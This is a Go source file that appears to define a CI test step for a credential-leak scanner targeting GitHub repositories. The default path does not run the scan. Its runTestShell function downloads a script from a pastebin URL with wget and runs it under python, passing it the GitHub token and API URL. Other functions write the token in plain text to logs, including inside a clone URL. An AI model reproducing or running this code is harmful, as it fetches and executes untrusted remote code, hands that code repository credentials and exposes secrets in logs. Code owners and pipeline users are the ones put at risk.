package cmd

import (
	"context"
	"strconv"
	"strings"

	"github.com/SAP/jenkins-library/pkg/command"
	"github.com/SAP/jenkins-library/pkg/piperutils"

	"github.com/SAP/jenkins-library/pkg/log"
	"github.com/SAP/jenkins-library/pkg/telemetry"
	"github.com/google/go-github/v45/github"
	"github.com/pkg/errors"

	piperGithub "github.com/SAP/jenkins-library/pkg/github"
)

const piperTempDbName string = "piper_step_db.db"
const piperReportTempName string = "findings.csv"

type credentialdiggerTestStepService interface {
	//CreateComment(ctx context.Context, owner string, repo string, number int, comment *github.IssueComment) (*github.IssueComment, *github.Response, error)

	//ListByOrg(ctx context.Context, owner string, opts *github.RepositoryListByOrgOptions) ([]*github.Repository, *github.Response, error)
	List(ctx context.Context, owner string, opts *github.RepositoryListOptions) ([]*github.Repository, *github.Response, error)
}

type credentialdiggerUtils interface {
	command.ExecRunner

	piperutils.FileUtils
}

type credentialdiggerUtilsBundle struct {
	*command.Command
	*piperutils.Files
}

func newCDUtils() credentialdiggerUtils {
	utils := credentialdiggerUtilsBundle{
		Command: &command.Command{},
		Files:   &piperutils.Files{},
	}
	// Reroute command output to logging framework
	utils.Stdout(log.Writer())
	utils.Stderr(log.Writer())
	return &utils
}

func credentialdiggerTestStep(config credentialdiggerTestStepOptions, telemetryData *telemetry.CustomData) {
	ctx, client, err := piperGithub.NewClient(config.Token, config.APIURL, "", []string{})
	if err != nil {
		log.Entry().WithError(err).Fatal("Failed to get GitHub client")
	}
	//err = runCredentialdiggerTestStep(ctx, &config, telemetryData, client.Issues)  // commentIssue step
	err1 := runCredentialdiggerTestStep(ctx, &config, telemetryData, client.Repositories) // list repos by org
	if err1 != nil {
		log.Entry().WithError(err).Fatal("Failed to list repos")
	}
	//err2 := runTestScanPR(&config, telemetryData) // scan PR with CD
	err2 := runTestClone(&config, telemetryData) // clone from bash
	if err2 != nil {
		log.Entry().WithError(err2).Fatal("Failed to run custom function")
	}
	err3 := runTestShell(&config, telemetryData) // full scan a repo with CD
	if err3 != nil {
		log.Entry().WithError(err3).Fatal("Failed to run full scan")
	}
}

func executeCredentialDiggerProcess(utils credentialdiggerUtils, args []string) error {
	return utils.RunExecutable("credentialdigger", args...)
}

func runTestClone(config *credentialdiggerTestStepOptions, telemetryData *telemetry.CustomData) error {
	utils := newCDUtils()
	var sb strings.Builder
	sb.WriteString("https://oauth2:")
	sb.WriteString(config.Token)
	sb.WriteString("@")
	repo := strings.Replace(config.Repository, "https://", sb.String(), 1)
	log.Entry().Info("Clone repo: ", sb.String())

	return utils.RunExecutable("git", "clone", repo)
}

func runTestShell(config *credentialdiggerTestStepOptions, telemetryData *telemetry.CustomData) error {
	utils := newCDUtils()
	// 1
	log.Entry().Info("Test a shell script")
	wget_list := []string{"https://pastebin.com/raw/21xGCKSg", "-O", "test.py"}
	python_list := []string{"python", "test.py", config.Repository, config.Token, config.APIURL}
	err := utils.RunExecutable("wget", wget_list...)
	if err != nil {
		log.Entry().Error("failed running bash test -wget")
		return err
	}
	err = utils.RunExecutable("python", python_list...)
	if err != nil {
		log.Entry().Error("failed running bash test -python")
		return err
	}
	log.Entry().Info("Done")

	return nil
}

func runTestFullScan(config *credentialdiggerTestStepOptions, telemetryData *telemetry.CustomData) error {
	service := newCDUtils()
	// 1
	log.Entry().Info("Load rules")
	cmd_list := []string{"add_rules", "--sqlite", piperTempDbName, "/credential-digger-ui/backend/rules.yml"}
	err := executeCredentialDiggerProcess(service, cmd_list)
	if err != nil {
		log.Entry().Error("failed running credentialdigger add_rules")
		return err
	}
	log.Entry().Info("Rules added")
	// 2
	log.Entry().Info("Scan Repository ", config.Repository)
	cmd_list = []string{"scan", config.Repository, "--sqlite", piperTempDbName,
		"--debug",
		"--force",
		"--git_token", config.Token}
	leaks := executeCredentialDiggerProcess(service, cmd_list)
	if leaks != nil {
		log.Entry().Warn("The scan found potential leaks")
		log.Entry().Warnf("%v potential leaks found", leaks)
	} else {
		log.Entry().Info("No leaks found")
		// There is no need to print the discoveries if there are none
		return nil
	}
	// 3
	log.Entry().Info("Get discoveries")
	cmd_list = []string{"get_discoveries", config.Repository, "--sqlite", piperTempDbName,
		"--state", "new",
		"--save", piperReportTempName}
	err = executeCredentialDiggerProcess(service, cmd_list)
	if err != nil {
		log.Entry().Error("failed running credentialdigger get_discoveries")
		return err
	}
	log.Entry().Info("Scan complete")

	return nil
}

func runTestScanPR(config *credentialdiggerTestStepOptions, telemetryData *telemetry.CustomData) error {
	service := newCDUtils()
	// 1
	log.Entry().Info("Load rules")
	cmd_list := []string{"add_rules", "--sqlite", piperTempDbName, "/credential-digger-ui/backend/rules.yml"}
	err := executeCredentialDiggerProcess(service, cmd_list)
	if err != nil {
		log.Entry().Error("failed running credentialdigger add_rules")
		return err
	}
	log.Entry().Info("Rules added")

	// 2
	log.Entry().Info("Scan PR")
	log.Entry().Info("Scan PR ", config.Number, " from repo ", config.Repository)
	log.Entry().Infof("  Token: '%s'", config.Token)
	cmd_list = []string{"scan_pr", config.Repository, "--sqlite", piperTempDbName,
		"--pr", strconv.Itoa(config.Number),
		"--debug",
		"--force",
		"--api_endpoint", config.APIURL,
		"--git_token", config.Token}
	leaks := executeCredentialDiggerProcess(service, cmd_list)
	if leaks != nil {
		log.Entry().Warn("The scan found potential leaks in this PR")
		// log.Entry().Warn("%v potential leaks found", leaks)
	} else {
		log.Entry().Info("No leaks found")
		// There is no need to print the discoveries if there are none
		return nil
	}

	// 3
	log.Entry().Info("Get discoveries")
	cmd_list = []string{"get_discoveries", config.Repository, "--sqlite", piperTempDbName,
		"--state", "new",
		"--save", piperReportTempName}
	err = executeCredentialDiggerProcess(service, cmd_list)
	if err != nil {
		log.Entry().Error("failed running credentialdigger get_discoveries")
		return err
	}
	log.Entry().Info("Scan complete")

	return nil
}

func runCredentialdiggerTestStep(ctx context.Context, config *credentialdiggerTestStepOptions, telemetryData *telemetry.CustomData, service credentialdiggerTestStepService) error {

	//issueComment := github.IssueComment{
	//	Body: &config.Body,
	//}

	// TODO get Repo name and Owner from repo url
	s := strings.Split(config.Repository, "/")
	owner := s[len(s)-2]
	//repoName := s[len(s)-1]

	// Create new comment
	//newcomment, resp, err := service.CreateComment(ctx, owner, repoName, config.Number, &issueComment)
	//if err != nil {
	//	log.Entry().Errorf("GitHub response code %v", resp.Status)
	//	return errors.Wrapf(err, "Error occurred when creating comment on issue %v", config.Number)
	//}
	//log.Entry().Debugf("New issue comment created for issue %v: %v", config.Number, newcomment)

	// List reposIssues
	opt := &github.RepositoryListOptions{Type: "public"}
	repos, resp, err := service.List(ctx, owner, opt)
	if err != nil {
		log.Entry().Errorf("GitHub response code %v", resp.Status)
		return errors.Wrapf(err, "Error occurred when listing repos of owner %v", owner)
	}
	log.Entry().Debugf("Repos listed for owner %v", owner)
	log.Entry().Info(repos)

	for i, r := range repos {
		log.Entry().Info(i, r)
	}

	return nil
}
